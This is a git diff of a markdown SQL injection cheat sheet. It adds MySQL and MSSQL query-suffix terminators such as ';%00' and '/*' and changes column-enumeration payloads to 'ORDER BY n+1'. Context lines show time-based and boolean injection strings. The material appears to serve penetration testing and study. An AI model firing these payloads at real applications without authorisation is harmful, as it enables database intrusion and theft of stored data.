@@ -33,6 +33,8 @@ id=2-1
 
 ### Suffix SQL Query List
 
+#### MySQL
+
 ```
 --
 #
@@ -40,7 +42,17 @@ id=2-1
 --<whitespace>
 -- -
 -- //
+;%00
+`
 AND ('abc'='abc
+```
+
+#### MSSQL
+
+```
+/*
+-- //
+;%00
 ```
 
 ## SQL Payloads
@@ -64,9 +76,11 @@ AND SLEEP(10)
 
 #### Fields Enumeration
 
+- Increment by determining the number of coulmns
+
 ```
-ORDER BY <number>
-GROUP BY <number>
+ORDER BY n+1
+GROUP BY n+1
 ```
 
 #### Double Injection (SubQuery) Enumeration
